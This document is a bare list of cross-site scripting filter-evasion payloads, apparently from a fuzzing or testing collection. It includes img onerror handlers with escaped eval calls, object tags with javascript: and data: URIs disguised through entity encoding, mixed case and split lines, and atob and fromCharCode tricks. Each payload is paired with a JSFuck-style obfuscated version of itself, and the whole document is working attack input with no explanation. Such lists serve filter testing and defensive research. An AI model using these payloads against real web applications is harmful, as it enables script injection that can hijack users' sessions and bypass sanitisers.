[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('&#x0061;lert("537")')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('&#97;lert("539")')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\a\l\ert\("541"\)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
/ale/.source+/rt/.source
[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]
String.FromCharCode(97,108,101,114,116)
(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
atob("YWxlcnQ=")
(false+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[2]+([false]+"")[3]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
17795081..toString(36)
(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
<object data="JaVaScRiPt:prompt(553)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&color;prompt(555)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="java
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]
script:prompt(559)">
(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&#x003A;prompt(561)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&#58;prompt(563)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="&#x6A;avascript:prompt(565)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]
data="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;prompt(569)">
([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html, <script>prompt(571)</script>">
